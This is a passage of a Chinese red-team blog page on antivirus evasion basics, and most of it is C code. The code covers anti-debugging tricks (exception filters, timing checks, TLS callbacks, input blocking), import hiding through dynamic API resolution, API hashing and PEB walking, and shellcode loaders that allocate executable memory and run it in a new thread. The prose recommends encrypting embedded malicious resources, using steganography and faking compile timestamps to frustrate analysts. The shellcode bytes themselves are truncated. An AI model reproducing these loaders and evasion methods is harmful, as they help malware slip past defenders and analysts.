+	PTOP_LEVEL_EXCEPTION_FILTER previousUnhandledExceptionFilter = SetUnhandledExceptionFilter(CustomUnhandledExceptionFilter);
+	RaiseException(EXCEPTION_FLT_DIVIDE_BY_ZERO, 0, 0, NULL);
+	SetUnhandledExceptionFilter(previousUnhandledExceptionFilter);
+	if (isDebugged) return;
+
+	wprintf_s(L&quot;Now hacking...\n&quot;);
+}
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><h3 id="自调试"><a href="#自调试" class="header-anchor">#</a> 自调试</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>if (!DebugActiveProcess(pid))
+{
+	HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+	TerminateProcess(hProcess, 0);
+}
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h3 id="执行时间"><a href="#执行时间" class="header-anchor">#</a> 执行时间</h3> <p>我们可以检查某个指令块之前和之后的系统时间，并假设测得的经过时间应小于某个值。如果正在分析应用程序，则可能在该指令块中设置了断点。如果这样，执行时间将超过假定的时间段。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>int t1 = GetTickCount64();
+Hack(); // should take less than 5 seconds
+int t2 = GetTickCount64();
+if (((t2 - t1) / 1000) &gt; 5) return; 
+
+wprintf_s(L&quot;Now hacking more...\n&quot;);
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h2 id="为逆向工程师增加难度"><a href="#为逆向工程师增加难度" class="header-anchor">#</a> 为逆向工程师增加难度</h2> <h3 id="执行路径回调"><a href="#执行路径回调" class="header-anchor">#</a> 执行路径回调</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>VOID CALLBACK MyCallback(DWORD errorCode, DWORD bytesTransferred, POVERLAPPED pOverlapped)
+{
+	MessageBoxW(NULL, L&quot;Catch me if you can&quot;, L&quot;xD&quot;, 0);
+}
+
+void main()
+{
+	HANDLE hFile = CreateFileW(L&quot;C:\\Windows\\win.ini&quot;, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
+	PVOID fileBuffer = VirtualAlloc(0, 64, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	OVERLAPPED overlapped = {0};
+	ReadFileEx(hFile, fileBuffer, 32, &amp;overlapped, MyCallback);
+
+	WaitForSingleObjectEx(hFile, INFINITE, true); // wait for the asynchronous operation to finish
+	wprintf_s(L&quot;Already pwned...\n&quot;);
+}
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><h3 id="tls（线程本地存储）回调"><a href="#tls（线程本地存储）回调" class="header-anchor">#</a> TLS（线程本地存储）回调</h3> <blockquote><p>TLS（线程本地存储）回调是一种Windows机制，允许在进程以及线程启动和终止上执行任意代码。它可以用来在main功能（或其他入口点）之前运行一些反调试代码。但是，大多数调试器会自动在断点之前main（“系统断点”- ntdll.LdrpDoDebuggerBreak）甚至在回调的开头放置断点。无论如何，回调实现需要某些链接器指令：</p></blockquote> <div class="language- line-numbers-mode"><pre class="language-text"><code>void NTAPI TlsCallback(PVOID DllHandle, DWORD dwReason, PVOID)
+{
+	if (dwReason == DLL_PROCESS_ATTACH)
+	{
+		if (CheckIfDebugged()) exit(0);
+	}
+}
+
+#pragma comment (linker, &quot;/INCLUDE:_tls_used&quot;)
+#pragma comment (linker, &quot;/INCLUDE:tls_callback_function&quot;)
+
+#pragma const_seg(&quot;.CRT$XLA&quot;)
+EXTERN_C const PIMAGE_TLS_CALLBACK tls_callback_function = TlsCallback;
+#pragma const_seg()
+
+void main()
+{
+	wprintf_s(L&quot;Now hacking...\n&quot;);
+}
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><h3 id="阻止用户输入-需要admin"><a href="#阻止用户输入-需要admin" class="header-anchor">#</a> 阻止用户输入-需要admin</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>BlockInput(true);
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="静态分析和混淆"><a href="#静态分析和混淆" class="header-anchor">#</a> 静态分析和混淆</h2> <h3 id="pe"><a href="#pe" class="header-anchor">#</a> PE</h3> <p>PE头包含了很多信息</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>headers, sections headers and content (code, resources etc.),
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>分析人员仅通过检查可执行文件（无需运行它）就可以提取大量有用的信息。这包括代码，导入的函数，硬编码的字符串和其他数据。</p> <h3 id="更改hash"><a href="#更改hash" class="header-anchor">#</a> 更改hash</h3> <ul><li>改图标</li> <li>加入版本信息</li></ul> <h3 id="通过动态winapi函数解析来隐藏导入"><a href="#通过动态winapi函数解析来隐藏导入" class="header-anchor">#</a> 通过动态WinAPI函数解析来隐藏导入</h3> <p>导入地址表（IAT）存储有关应用程序使用的库和函数的信息。操作系统会在可执行文件启动时动态加载它们。非常方便（这正是Windows的工作方式），但是表内容可以提供许多有关程序功能的信息。例如存储器操作和线程操作功能（VirtualAlloc，VirtualProcect，CreateRemoteThread）可以指示该应用正在执行某种代码注入的。WSASocket通常由绑定外壳和反向外壳以及SetWindowsHookEx键盘记录程序使用。</p> <p>为了隐藏这些信息（从静态分析中），我们可以动态地解析某些API函数。我们甚至可以使用syscalls（请参阅userland钩子规避）。现在，让我们仅使用GetModuleHandle获取要kernel32.dll加载到内存中的句柄，然后使用以下命令查找必要的功能GetProcAddress：</p> <p>https://github.com/lucasg/Dependencies可以查看PE信息</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>typedef PVOID(WINAPI *PVirtualAlloc)(PVOID, SIZE_T, DWORD, DWORD);
+typedef PVOID(WINAPI *PCreateThread)(PSECURITY_ATTRIBUTES, SIZE_T, PTHREAD_START_ROUTINE, PVOID, DWORD, PDWORD);
+typedef PVOID(WINAPI *PWaitForSingleObject)(HANDLE, DWORD);
+
+void main()
+{
+	HMODULE hKernel32 = GetModuleHandleW(L&quot;kernel32.dll&quot;);
+	PVirtualAlloc funcVirtualAlloc = (PVirtualAlloc)GetProcAddress(hKernel32, &quot;VirtualAlloc&quot;);
+	PCreateThread funcCreateThread = (PCreateThread)GetProcAddress(hKernel32, &quot;CreateThread&quot;);
+	PWaitForSingleObject funcWaitForSingleObject = (PWaitForSingleObject)GetProcAddress(hKernel32, &quot;WaitForSingleObject&quot;);
+
+	unsigned char shellcode[] = &quot;\\xfc\\x48\\x83 (...) &quot;;
+	PVOID shellcode_exec = funcVirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	memcpy(shellcode_exec, shellcode, sizeof shellcode);
+	DWORD threadID;
+	HANDLE hThread = funcCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &amp;threadID);
+	funcWaitForSingleObject(hThread, INFINITE);
+}
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><h3 id="api-hashing"><a href="#api-hashing" class="header-anchor">#</a> API Hashing</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>typedef PVOID(WINAPI *PVirtualAlloc)(PVOID, SIZE_T, DWORD, DWORD);
+typedef PVOID(WINAPI *PCreateThread)(PSECURITY_ATTRIBUTES, SIZE_T, PTHREAD_START_ROUTINE, PVOID, DWORD, PDWORD);
+typedef PVOID(WINAPI *PWaitForSingleObject)(HANDLE, DWORD);
+
+unsigned int hash(const char *str)
+{
+	unsigned int hash = 7759;
+	int c;
+
+	while (c = *str++)
+		hash = ((hash &lt;&lt; 5) + hash) + c;
+
+	return hash;
+}
+
+void main()
+{
+	HMODULE hKernel32 = GetModuleHandle(L&quot;kernel32.dll&quot;);
+	PVirtualAlloc funcVirtualAlloc;
+	PCreateThread funcCreateThread;
+	PWaitForSingleObject funcWaitForSingleObject;
+
+	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hKernel32;
+	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)hKernel32 + pDosHeader-&gt;e_lfanew);
+	PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&amp;(pNtHeader-&gt;OptionalHeader);
+	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hKernel32 + pOptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+	PULONG pAddressOfFunctions = (PULONG)((PBYTE)hKernel32 + pExportDirectory-&gt;AddressOfFunctions);
+	PULONG pAddressOfNames = (PULONG)((PBYTE)hKernel32 + pExportDirectory-&gt;AddressOfNames);
+	PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)hKernel32 + pExportDirectory-&gt;AddressOfNameOrdinals);
+
+	for (int i = 0; i &lt; pExportDirectory-&gt;NumberOfNames; ++i)
+	{
+		PCSTR pFunctionName = (PSTR)((PBYTE)hKernel32 + pAddressOfNames[i]);
+		if (hash(pFunctionName) == 0x80fa57e1)
+		{
+			funcVirtualAlloc = (PVirtualAlloc)((PBYTE)hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
+		}
+		if (hash(pFunctionName) == 0xc7d73c9b)
+		{
+			funcCreateThread = (PCreateThread)((PBYTE)hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
+		}
+		if (hash(pFunctionName) == 0x50c272c4)
+		{
+			funcWaitForSingleObject = (PWaitForSingleObject)((PBYTE)hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
+		}
+	}
+
+	unsigned char shellcode[] = &quot;\\xfc\\x48\\x83&quot;;
+
+	PVOID shellcode_exec = funcVirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	memcpy(shellcode_exec, shellcode, sizeof shellcode);
+	DWORD threadID;
+	HANDLE hThread = funcCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &amp;threadID);
+	funcWaitForSingleObject(hThread, INFINITE);
+}
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br></div></div><h3 id="shellcode-style"><a href="#shellcode-style" class="header-anchor">#</a> shellcode style</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>typedef HMODULE(WINAPI *PGetModuleHandleA)(PCSTR);
+typedef FARPROC(WINAPI *PGetProcAddress)(HMODULE, PCSTR);
+
+typedef PVOID(WINAPI *PVirtualAlloc)(PVOID, SIZE_T, DWORD, DWORD);
+typedef PVOID(WINAPI *PCreateThread)(PSECURITY_ATTRIBUTES, SIZE_T, PTHREAD_START_ROUTINE, PVOID, DWORD, PDWORD);
+typedef PVOID(WINAPI *PWaitForSingleObject)(HANDLE, DWORD);
+
+void main()
+{
+	PPEB pPEB = (PPEB)__readgsqword(0x60);
+	PPEB_LDR_DATA pLoaderData = pPEB-&gt;Ldr;
+	PLIST_ENTRY listHead = &amp;pLoaderData-&gt;InMemoryOrderModuleList;
+	PLIST_ENTRY listCurrent = listHead-&gt;Flink;
+	PVOID kernel32Address;
+	do
+	{
+		PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(listCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+		DWORD dllNameLength = WideCharToMultiByte(CP_ACP, 0, dllEntry-&gt;FullDllName.Buffer, dllEntry-&gt;FullDllName.Length, NULL, 0, NULL, NULL);
+		PCHAR dllName = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllNameLength);
+		WideCharToMultiByte(CP_ACP, 0, dllEntry-&gt;FullDllName.Buffer, dllEntry-&gt;FullDllName.Length, dllName, dllNameLength, NULL, NULL);
+		CharUpperA(dllName);
+		if (strstr(dllName, &quot;KERNEL32.DLL&quot;))
+		{
+			kernel32Address = dllEntry-&gt;DllBase;
+			HeapFree(GetProcessHeap(), 0, dllName);
+			break;
+		}
+		HeapFree(GetProcessHeap(), 0, dllName);
+		listCurrent = listCurrent-&gt;Flink;
+	} while (listCurrent != listHead);
+
+	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)kernel32Address;
+	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)kernel32Address + pDosHeader-&gt;e_lfanew);
+	PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&amp;(pNtHeader-&gt;OptionalHeader);
+	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)kernel32Address + pOptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+	PULONG pAddressOfFunctions = (PULONG)((PBYTE)kernel32Address + pExportDirectory-&gt;AddressOfFunctions);
+	PULONG pAddressOfNames = (PULONG)((PBYTE)kernel32Address + pExportDirectory-&gt;AddressOfNames);
+	PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)kernel32Address + pExportDirectory-&gt;AddressOfNameOrdinals);
+
+	PGetModuleHandleA pGetModuleHandleA = NULL;
+	PGetProcAddress pGetProcAddress = NULL;
+
+	for (int i = 0; i &lt; pExportDirectory-&gt;NumberOfNames; ++i)
+	{
+		PCSTR pFunctionName = (PSTR)((PBYTE)kernel32Address + pAddressOfNames[i]);
+		if (!strcmp(pFunctionName, &quot;GetModuleHandleA&quot;))
+		{
+			pGetModuleHandleA = (PGetModuleHandleA)((PBYTE)kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
+		}
+		if (!strcmp(pFunctionName, &quot;GetProcAddress&quot;))
+		{
+			pGetProcAddress = (PGetProcAddress)((PBYTE)kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
+		}
+	}
+
+	HMODULE hKernel32 = pGetModuleHandleA(&quot;kernel32.dll&quot;);
+	PVirtualAlloc funcVirtualAlloc = (PVirtualAlloc)pGetProcAddress(hKernel32, &quot;VirtualAlloc&quot;);
+	PCreateThread funcCreateThread = (PCreateThread)pGetProcAddress(hKernel32, &quot;CreateThread&quot;);
+	PWaitForSingleObject funcWaitForSingleObject = (PWaitForSingleObject)pGetProcAddress(hKernel32, &quot;WaitForSingleObject&quot;);
+
+	unsigned char shellcode[] = &quot;\\xfc\\x48\\x83 (...) &quot;;
+	PVOID shellcode_exec = funcVirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	memcpy(shellcode_exec, shellcode, sizeof shellcode);
+	DWORD threadID;
+	HANDLE hThread = funcCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &amp;threadID);
+	funcWaitForSingleObject(hThread, INFINITE);
+}
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br></div></div><h3 id="pe-analysis"><a href="#pe-analysis" class="header-anchor">#</a> PE analysis</h3> <p>在静态检查恶意样本时，恶意软件分析师会查看PE文件的结构和内容。此数据可能会揭示有关该应用程序的某些详细信息，并有助于将其分类为恶意软件。我们讨论了导入，现在让我们集中讨论其他PE部分，嵌入式资源和时间戳。</p> <p>pe结构看这里<a href="https://thunderjie.github.io/2019/03/27/PE%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener noreferrer">pe结构详解<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <h4 id="时间"><a href="#时间" class="header-anchor">#</a> 时间</h4> <p>PE标头包含TimeDateStamp4字节字段，这是Unix编译时间。可以轻松更改（例如使用十六进制编辑器）以隐藏实际的编译日期。</p> <h4 id="资源文件"><a href="#资源文件" class="header-anchor">#</a> 资源文件</h4> <p>我们可以将任何数据作为资源嵌入可执行文件中，例如图标，诱饵文档或shellcode。但是，使用Resource Hacker或任何类似工具，一切都将可见。嵌入加密的恶意资源或使用隐写术是一个好主意，这使得检查它们变得更加困难。</p> <h3 id="熵分析"><a href="#熵分析" class="header-anchor">#</a> 熵分析</h3> <p>熵分析可用于轻松查找嵌入在可执行文件中的潜在加密内容。加密的数据通常具有较高的熵（几乎8位）。压缩数据也是如此。</p> <p>我们可以使用这个简单的Python脚本（一定要安装pefile模块）来计算PE文件段的熵：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>import sys
+import math
+import pefile
+import peutils
+
+def Entropy(data):
+	entropy = 0  
+	if not data:
+		return 0
+	ent = 0
+	for x in range(256):
+		p_x = float(data.count(x))/len(data)
+		if p_x &gt; 0:
+			entropy += - p_x*math.log(p_x, 2)
+	return entropy
+
+pe=pefile.PE(sys.argv[1])
+for s in pe.sections:
+	print (s.Name.decode('utf-8').strip('\\x00') + &quot;\\t&quot; + str(Entropy(s.get_data())))
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><h2 id="编译选项"><a href="#编译选项" class="header-anchor">#</a> 编译选项</h2> <ul><li>多线程-MT</li> <li>不生成调试信息，会泄露用户数据</li></ul> <p><img src="https://i.loli.net/2021/03/26/IlDEh3N2ro5QPCH.jpg" alt="-w862"></p> <ul><li>UAC权限</li></ul> <p><img src="https://i.loli.net/2021/03/26/Uj1FawIM9ZRJQtS.jpg" alt="-w783"></p></div></div> <div class="page-slot page-slot-bottom"><!-- 横向自适应 -->
+      <ins class="adsbygoogle"
+          style="display:block"
+          data-ad-client="ca-pub-7828333725993554"
+          data-ad-slot="6620245489"
+          data-ad-format="auto"
+          data-full-width-responsive="true"></ins>
+      <script>
+          (adsbygoogle = window.adsbygoogle || []).push({});
+      </script></div> <div class="page-edit"><div class="edit-link"><a href="https://github.com/XTeam-Wing/edit/master/docs/01.Blog/04.BypassAV/01.基础知识/01.免杀基础知识.md" target="_blank" rel="noopener noreferrer">Edit this page</a> <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></div> <div class="tags"><a href="/tags/?tag=%E5%85%8D%E6%9D%80" title="标签">#免杀</a></div> <!----></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/pages/f5c866/" class="page-nav-centre page-nav-centre-prev"><div class="tooltip">快速入门开发IOS插件</div></a> <a href="/pages/fe81b9/" class="page-nav-centre page-nav-centre-next"><div class="tooltip">index</div></a></div> <div class="page-nav"><p class="inner"><span class="prev">
+        ←
+        <a href="/pages/f5c866/" class="prev">快速入门开发IOS插件</a></span> <span class="next"><a href="/pages/fe81b9/">index</a>→
+      </span></p></div></div></div> <div class="article-list"><div class="article-title"><a href="/archives/" class="iconfont icon-bi">最近更新</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/pages/00c27d/"><div>调用阿里云OpenAPI创建抢占式实例</div></a> <span>06-29</span></dt></dl><dl><dd>02</dd> <dt><a href="/pages/5e9891/"><div>Github项目集成qodana进行静态代码扫描</div></a> <span>06-26</span></dt></dl><dl><dd>03</dd> <dt><a href="/pages/66f295/"><div>Web敏感信息识别工具</div></a> <span>06-23</span></dt></dl> <dl><dd></dd> <dt><a href="/archives/" class="more">更多文章&gt;</a></dt></dl></div></div></main></div> <div class="footer"><div class="icons"><a href="mailto:redteam@aliyun.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/XTeam-Wing" title="GitHub" target="_blank" class="iconfont icon-github"></a><a href="https://twitter.com/XTeamWing" title="推特" target="_blank" class="iconfont icon-erji"></a></div> <div class="busuanzi"><p>
+      Wing已运营本站:  
+    </p> <span id="busuanzi_container_site_pv" style="display:none">
+    本站总访问量
+    <span id="busuanzi_value_site_pv"></span>次
+    <span class="post-meta-divider">|</span></span> <span id="busuanzi_container_site_uv" style="display:none">
+    本站访客数
+    <span id="busuanzi_value_site_uv"></span>人
+  </span></div> <a href="https://github.com/XTeam-Wing/" target="_blank" title="本站主题">RedTeaming</a> 
+    | Copyright © 2020-2023
+    <span>Wing | <a href="https://weibo.com/u/6077156187?topnav=1&wvr=6&topsug=1" target="_blank">MIT License</a></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">跟随系统</li><li class="iconfont icon-rijianmoshi">浅色模式</li><li class="iconfont icon-yejianmoshi">深色模式</li><li class="iconfont icon-yuedu">阅读模式</li></ul></div></div> <!----> <!----> <div class="custom-html-window custom-html-window-rb" style="display:;"><div class="custom-wrapper"><i class="close-but">×</i> <div><!-- 固定160*160px -->
+      <ins class="adsbygoogle"
+          style="display:inline-block;max-width:160px;max-height:160px"
+          data-ad-client="ca-pub-7828333725993554"
+          data-ad-slot="8377369658"></ins>
+      <script>
+          (adsbygoogle = window.adsbygoogle || []).push({});
+      </script>
+      </div></div></div></div><div class="global-ui"><div></div></div></div>
+    <script src="/assets/js/app.be83bd91.js" defer></script><script src="/assets/js/2.b71e909d.js" defer></script><script src="/assets/js/3.aae92b90.js" defer></script><script src="/assets/js/17.7e6ee0d8.js" defer></script>
+  </body>
+</html>
